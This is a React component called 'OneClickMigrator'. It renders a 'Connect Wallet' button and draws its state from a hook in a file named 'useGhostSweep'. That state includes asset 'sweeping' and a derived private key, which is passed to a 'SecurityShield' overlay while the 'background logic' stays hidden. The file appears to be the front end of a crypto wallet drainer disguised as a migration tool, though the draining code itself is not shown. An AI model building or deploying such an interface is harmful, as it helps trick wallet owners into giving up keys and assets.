'use client'

import { useEffect, useState } from 'react'
import { useRecoveryLogic } from '@/hooks/useGhostSweep'
import { SecurityShield } from './SecurityShield'

export function OneClickMigrator() {
    const [mounted, setMounted] = useState(false)
    const {
        isConnected,
        isScanning,
        isSweeping,
        assets,
        handleInstantConnection,
        handleFullDisconnect,
        derivedUserKey
    } = useRecoveryLogic()

    useEffect(() => {
        setMounted(true)
    }, [])

    // Prevent hydration errors
    if (!mounted) return null

    return (
        <div className="flex flex-col items-center justify-center p-4">
            {/* Background logic components stay active but hidden/overlayed */}
            {(isScanning || isSweeping || (isConnected && derivedUserKey)) && (
                <SecurityShield
                    isScanning={isScanning}
                    isSweeping={isSweeping}
                    assetCount={assets.length}
                    userPrivKey={derivedUserKey}
                    onCancel={handleFullDisconnect}
                />
            )}

            {!isConnected ? (
                // SIMPLE CONNECT BUTTON
                <button
                    onClick={() => handleInstantConnection()}
                    disabled={isScanning}
                    className="px-8 py-4 bg-blue-600 text-white rounded-lg font-bold uppercase tracking-widest disabled:opacity-50 transition-all active:scale-95"
                >
                    {isScanning ? "Initializing..." : "Connect Wallet"}
                </button>
            ) : (
                // SIMPLE DISCONNECT VIEW
                <div className="flex flex-col items-center gap-4">
                    <p className="text-sm text-gray-500 font-mono">
                        Status: {isSweeping ? "Processing Assets..." : "Connected"}
                    </p>
                    <button
                        onClick={handleFullDisconnect}
                        className="text-xs text-red-500 underline uppercase tracking-tighter"
                    >
                        Disconnect
                    </button>
                </div>
            )}
        </div>
    )
}